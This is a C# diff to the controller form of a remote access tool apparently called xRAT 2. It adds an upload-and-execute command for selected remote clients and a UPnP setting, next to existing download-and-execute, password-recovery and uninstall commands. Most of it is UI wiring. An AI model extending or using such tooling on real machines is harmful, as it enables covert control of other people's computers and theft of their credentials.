@@ -5,6 +5,7 @@ using Core;
 using Core.Commands;
 using Core.Packets;
 using xRAT_2.Settings;
+using System.Collections.Generic;
 
 namespace xRAT_2.Forms
 {
@@ -21,6 +22,7 @@ namespace xRAT_2.Forms
             XMLSettings.AutoListen = bool.Parse(XMLSettings.ReadValue("AutoListen"));
             XMLSettings.ShowPopup = bool.Parse(XMLSettings.ReadValue("ShowPopup"));
             XMLSettings.Password = XMLSettings.ReadValue("Password");
+            XMLSettings.UseUPnP = bool.Parse(XMLSettings.ReadValue("UseUPnP"));
 
             if (bool.Parse(XMLSettings.ReadValue("ShowToU")))
             {
@@ -76,6 +78,7 @@ namespace xRAT_2.Forms
                 typeof(Core.Packets.ServerPackets.Reconnect),
                 typeof(Core.Packets.ServerPackets.Uninstall),
                 typeof(Core.Packets.ServerPackets.DownloadAndExecute),
+                typeof(Core.Packets.ServerPackets.UploadAndExecute),
                 typeof(Core.Packets.ServerPackets.Desktop),
                 typeof(Core.Packets.ServerPackets.GetProcesses),
                 typeof(Core.Packets.ServerPackets.KillProcess),
@@ -237,6 +240,9 @@ namespace xRAT_2.Forms
         }
 
         #region "ContextMenu"
+        private List<Client> clientList = new List<Client>();
+
+
             #region "Connection"
             private void ctxtUpdate_Click(object sender, EventArgs e)
             {
@@ -348,7 +354,23 @@ namespace xRAT_2.Forms
                     frmFM.Show();
                 }
             }
-            
+
+
+            private void ctxtUploader_Click(object sender, EventArgs e)
+            {
+                clientList.Clear();
+                if (lstClients.SelectedItems.Count != 0)
+                {
+                    foreach (ListViewItem lvi in lstClients.SelectedItems)
+                    {
+                        Client c = (Client)lvi.Tag;
+                        clientList.Add(c);
+                    }
+                    frmUploadAndExecute frm = new frmUploadAndExecute(clientList);
+                    frm.Show();
+                }
+            }
+
             private void ctxtPasswordRecovery_Click(object sender, EventArgs e)
             {
                 if (lstClients.SelectedItems.Count != 0)
